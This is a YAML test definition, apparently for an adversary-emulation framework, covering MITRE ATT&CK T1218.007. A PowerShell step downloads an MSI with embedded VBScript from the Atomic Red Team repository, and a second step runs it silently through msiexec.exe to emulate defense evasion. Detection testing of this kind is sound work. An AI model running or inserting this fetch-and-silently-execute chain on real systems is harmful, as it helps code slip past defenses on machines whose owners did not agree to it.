api_version: "2.0"
name: Msiexec.exe - Execute Local MSI file with embedded VBScript
description: |
    Executes an MSI containing embedded VBScript code using msiexec.exe
args:
    - name: msi_payload
      type: path
      default: PathToAtomicsFolder\T1218.007\bin\T1218.007_VBScript.msi
    - name: msi_exe
      type: path
      default: c:\windows\system32\msiexec.exe
    - name: action
      type: string
      default: i
uuid: 8d73c7b0-c2b1-4ac1-881a-4aa644f76064
mitre:
    tactics:
        - 'TA0005: Defense Evasion'
    techniques:
        - 'T1218: System Binary Proxy Execution'
    subtechniques:
        - 'T1218.007: Msiexec'
requirements:
    platforms:
        - os: windows
steps:
    - name: |
        The MSI file must exist on disk at specified location (#{msi_payload})
      inline: |
        if (Test-Path "#{msi_payload}") {exit 0} else {{New-Item -Type Directory (split-path "#{msi_payload}") -ErrorAction ignore | Out-Null
        Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.007/bin/T1218.007_VBScript.msi" -OutFile "#{msi_payload}"
        }}
      executor: powershell
    - name: msiexec.exe---execute-local-msi-file-with-embedded-vbscript
      inline: |
        {{.Args.msi_exe}} /q /{{.Args.action}} "{{.Args.msi_payload}}"
      executor: command_prompt
      cleanup:
        inline: ""
        executor: command_prompt
